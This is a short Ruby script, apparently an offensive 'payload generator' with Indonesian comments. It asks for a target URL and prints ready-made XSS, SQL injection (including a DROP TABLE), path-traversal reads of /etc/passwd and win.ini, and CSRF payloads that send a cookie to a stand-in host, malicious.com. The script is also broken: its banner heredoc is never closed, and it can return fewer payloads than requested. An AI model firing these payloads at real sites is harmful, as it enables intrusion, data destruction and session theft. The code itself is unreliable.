#!/usr/bin/env ruby
# pylot_gen_terminal.rb
# Payload generator - tampil di terminal saja

require 'securerandom'

# ASCII Art Header
HEADER = <<~ART
.______      ___   ____    ____  __        ______        ___       _______                  _______   _______ 
|   _  \    /   \  \   \  /   / |  |      /  __  \      /   \     |       \                /  _____| /  _____|
|  |_)  |  /  ^  \  \   \/   /  |  |     |  |  |  |    /  ^  \    |  .--.  |    ______    |  |  __  |  |  __  
|   ___/  /  /_\  \  \_    _/   |  |     |  |  |  |   /  /_\  \   |  |  |  |   |______|   |  | |_ | |  | |_ | 
|  |     /  _____  \   |  |     |  `----.|  `--'  |  /  _____  \  |  '--'  |              |  |__| | |  |__| | 
| _|    /__/     \__\  |__|     |_______| \______/  /__/     \__\ |_______/                \______|  \______| 
                                                                                                              
  
       Copyright © Peju3ncer - GG is Gabut Generator

puts HEADER

# Daftar payload
PAYLOADS = {
  "XSS" => [
    "<script>alert('XSS')</script>",
    "\"><img src=x onerror=alert(1)>",
    "'><svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>"
  ],
  "SQLi" => [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL--",
    "' OR '1'='1' --",
    "\" OR 1=1 --"
  ],
  "LFI" => [
    "../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../windows/win.ini",
    "../../var/log/apache2/access.log"
  ],
  "CSRF" => [
    "<img src='http://malicious.com/csrf?cookie=XYZ'>",
    "<iframe src='http://malicious.com/csrf'>",
    "<form action='http://malicious.com/csrf' method='POST'></form>"
  ]
}

# Fungsi generate payload
def generate_payloads(type, jumlah)
  pool = PAYLOADS[type]
  (1..jumlah).map { pool.sample }.uniq
end

# Menu
puts "\n=== Pilih tipe payload ==="
PAYLOADS.keys.each_with_index { |k, i| puts "#{i+1}. #{k}" }
print "Pilihan (1-#{PAYLOADS.keys.size}): "
choice = gets.chomp.to_i

type = PAYLOADS.keys[choice-1] rescue nil
unless type
  puts "Pilihan tidak valid"
  exit
end

# Input URL
print "\nMasukkan URL full dengan parameter: "
url = gets.chomp

# Jumlah payload
print "Jumlah payload (min 10, max 30): "
jumlah = gets.chomp.to_i
jumlah = 10 if jumlah < 10
jumlah = 30 if jumlah > 30

# Generate
payloads = generate_payloads(type, jumlah)

# Output ke terminal
puts "\n=== Payload untuk #{url} (#{type}) ==="
payloads.each_with_index do |p, i|
  puts "#{i+1}. #{p}"
end

puts "\nSelesai! ✅"
